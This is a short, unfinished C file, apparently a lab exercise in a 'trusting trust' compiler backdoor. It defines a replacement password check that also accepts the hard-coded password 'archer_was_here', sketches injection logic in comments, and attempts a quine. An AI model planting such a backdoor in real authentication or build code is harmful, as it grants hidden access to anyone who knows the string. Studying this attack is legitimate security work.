#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// TODO: Turn this into a quine
int main() {
    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
    // if (strcmp(line, before) == 0) { // Replacement
    //     line = after;
    // }
    // if (i>=2 && strcmp(lines[i-2], "  int num_lines = read_lines_to_array(fp, &lines);\n") == 0) { // Injection
    //     char* _s = "";
    //     fwrite(s, strlen(s), 1, out);
    // }
    // fwrite(line, 1, strlen(line), out);

    char* f = "char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c; char* f = %c%s%c; printf(f, 34, 9, 92, 34, 34, f, 34);";
    printf(f, 34, 9, 92, 34, 34, f, 34);
}